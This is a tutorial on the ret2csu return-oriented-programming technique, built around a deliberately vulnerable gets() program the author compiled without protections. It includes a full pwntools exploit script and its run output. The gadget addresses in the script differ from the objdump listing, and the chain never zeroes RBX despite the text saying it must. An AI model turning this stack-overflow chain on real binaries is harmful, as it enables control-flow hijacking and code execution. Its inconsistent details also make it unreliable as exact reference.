# Exploits
## Return to CSU (ret2csu)
## Required to understand : Return Oriented Programming
ret2csu is a technique using 2 gadgets which are (almost) always present in a program which can control : `RDI`, `RSI` and `RDX`  
Let's have an example program to exploit in 64 bits :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void target(unsigned int arg1, unsigned int arg2, unsigned int arg3)
// arg1 : RDI
// arg2 : RSI
// arg3 : RDX
{
	if(arg1 == 0xb47ec0de && arg2 == 0xdeadc0de && arg3 == 0xad1da5)
	{
		printf("We got a winner\n");
	}
	else
	{
		printf("You did call the target function but without good arguments...\n");
	}
}

void vuln()
{
	char buffer[64];
	gets(buffer);
}

int main(void)
{
	vuln();
}
```
We have to set 
RDI to `0xb47ec0de`  
RSI to `0xdeadc0de`  
and RDX to `0xad1da5`  
I've compiled it with :
```bash
gcc <source code file>.c -o <executable> -fno-stack-protector -m64 -no-pie
```
So the goal is to call the `target` function with correct parameters, if you don't know how parameters are passed in 64 bits, i made an article for that : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/Function-calling-convertions-c.md  
So we have to get control of RDI, RSI and RDX, if we use ROPgadget, we can see that there's no `pop rdx ; ret` gadget :
```
ROPgadget --binary vuln | grep "pop rdx"
```
```
(got nothing)
```
So let's look at deeper in the disassembled code for something which could be used to control RDX (by the way there are gadgets to control RDI and RSI)  
I will use `objdump` for that :
```
objdump -d <executable> -M intel
```
At the function `__libc_csu_init` there's something interesting :
```nasm
...
4011a8:	4c 89 f2             	mov    rdx,r14
4011ab:	4c 89 ee             	mov    rsi,r13
4011ae:	44 89 e7             	mov    edi,r12d
4011b1:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
4011b5:	48 83 c3 01          	add    rbx,0x1
4011b9:	48 39 dd             	cmp    rbp,rbx
4011bc:	75 ea                	jne    4011a8 <__libc_csu_init+0x38>
4011be:	48 83 c4 08          	add    rsp,0x8
4011c2:	5b                   	pop    rbx
4011c3:	5d                   	pop    rbp
4011c4:	41 5c                	pop    r12
4011c6:	41 5d                	pop    r13
4011c8:	41 5e                	pop    r14
4011ca:	41 5f                	pop    r15
...
```
There are two linked gadgets here :
```nasm
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
```
and
```nasm
mov rdx, r14
mov rsi, r13
mov edi, r12d # basically r12
call QWORD PTR [r15+rbx*8]
```
Okay that's awesome so we could use the first gadget to set `R14` to `0xad1da5`, `R13` to `0xdeadc0de` and `R12` to `0xb47ec0de` and then use the second gadget to set `RDX` to `R14`, `RSI` to `R13` and `EDI` to `R12` and then return to `target` !  
But... There's something wrong with this, actually, the second "gadget" is not considered as a gadget because there's no `ret` at the end, there's a call to the value which `R15` points to plus `RBX` times `8`, that just means that we first have to set `RBX` to `0`, write the address of `target` in a `RW` memory segment (such as .data) and then set `R15` to this location, note that it's accessing the value that it's pointing to, not it's value  
So our plan will look like this :
```
EDI => R12 => 0xb47ec0de
RDI => R13 => 0xdeadc0de
RDX => R14 => 0x00ad1da5
R15 -points> .data => &target
```
So let's create the exploit for that :
```python
from pwn import *
import struct
import time

p = process("./vuln")
```
So we need a `pop rdi ; ret` gadget, a `pop rsi ; pop r15 ; ret` gadget, `gets@plt` for a write-what-where (in .data), the address of `.data`, the `pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` gadget, the `mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call QWORD PTR [r15+rbx*8]` gadget and finally the `target` function address  
So i wrote that in the script :
```python
POP_RDI_GADGET = 0x40120b # pop rdi ; ret | use ROPgadget
POP_RSI_R15_GADGET = 0x401209 # pop rsi ; pop r15 ; ret | use ROPgadget
GETS_PLT_ADDR = 0x401040 # gets@PLT | (gdb)> info functions gets@plt
DATA_SEG_ADDR = 0x404028 # .data segment address | readelf -S <executable> | grep ".data"
POP_CHAIN_GADGET = 0x401204 # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret | use objdump
MOV_CHAIN_GADGET = 0x4011e8 # mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call QWORD PTR [r15+rbx*8] | use objdump 
TARGET_FUNCTION_ADDR = 0x401132 # (gdb)> x target
```
So let's make the ropchain, so first we have the overflow, in 64 bits it's the buffer length + RBP and then we overwrite `RIP`, so it's `72` for me :
```python
payload = b"A"*72 # offset before controlling RIP
```
Then we need to write the `target` function address in `.data` using the trick with double input call write-what-where described in this article : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explt/Stack-buffer-overflow/Input-arbitrary-write.md  
Or we can use any other way  
Remember that we have to pass the address where `gets` will write in the `RDI` register
```python
# Write syscall gadget address in .data
# Set argument for gets() in RDI
payload += p64(POP_RDI_GADGET)
payload += p64(DATA_SEG_ADDR) # RDI => .data address
# Call gets(<.data address>), it will write input to .data address
payload += p64(GETS_PLT_ADDR) # gets(.data)
```
Okay so at this point, `gets` is called, we will just have to pass the address of `target` via `STDIN` at this moment  
Now we can use the actual ret2csu technique :
```python
payload += p64(POP_CHAIN_GADGET)
payload += p64(0xb47ec0de) # R12 => EDI (arg1)
payload += p64(0xdeadc0de) # R13 => RSI (arg2)
payload += p64(0x00ad1da5) # R14 => RDX (arg3)
payload += p64(DATA_SEG_ADDR) # R15 => RDX -> .data => target
payload += p64(MOV_CHAIN_GADGET)
"""
mov    rdx,r14
mov    rsi,r13
mov    edi,r12d
call   QWORD PTR [r15+rbx*8]
"""
```
So it corresponds to the original plan  
Now we just have to send the payload and send the address of `target` which will be placed in `.data` with `gets` with a timeout of 1 second :
```python
p.sendline(payload)
time.sleep(1)
p.sendline(p64(TARGET_FUNCTION_ADDR))
time.sleep(1)
p.interactive()
```
Here is the full script code :
```python
"""
	ret2csu exploit
"""
from pwn import *
import struct
import time

p = process("./vuln")
#pause()
POP_RDI_GADGET = 0x40120b # pop rdi ; ret | use ROPgadget
POP_RSI_R15_GADGET = 0x401209 # pop rsi ; pop r15 ; ret | use ROPgadget
GETS_PLT_ADDR = 0x401040 # gets@PLT | (gdb)> info functions gets@plt
DATA_SEG_ADDR = 0x404028 # .data segment address | readelf -S <executable> | grep ".data"
POP_CHAIN_GADGET = 0x401204 # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret | use objdump
MOV_CHAIN_GADGET = 0x4011e8 # mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call QWORD PTR [r15+rbx*8] | use objdump 
TARGET_FUNCTION_ADDR = 0x401132 # (gdb)> x target

payload = b"A"*72 # offset before controlling RIP
# Write syscall gadget address in .data
# Set argument for gets() in RDI
payload += p64(POP_RDI_GADGET)
payload += p64(DATA_SEG_ADDR) # RDI => .data address
# Call gets(<.data address>), it will write input to .data address
payload += p64(GETS_PLT_ADDR) # gets(.data)

payload += p64(POP_CHAIN_GADGET)
payload += p64(0xb47ec0de) # R12 => EDI (arg1)
payload += p64(0xdeadc0de) # R13 => RSI (arg2)
payload += p64(0x00ad1da5) # R14 => RDX (arg3)
payload += p64(DATA_SEG_ADDR) # R15 => RDX -> .data => target
payload += p64(MOV_CHAIN_GADGET)
"""
mov    rdx,r14
mov    rsi,r13
mov    edi,r12d
call   QWORD PTR [r15+rbx*8]
"""
p.sendline(payload)
time.sleep(1)
p.sendline(p64(TARGET_FUNCTION_ADDR))
time.sleep(1)
p.interactive()
```
Let's use it :
```bash
python3 exploit.py
[+] Starting local process './vuln': pid 3446
[*] Switching to interactive mode
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 3446)
We got a winner
```
It worked !
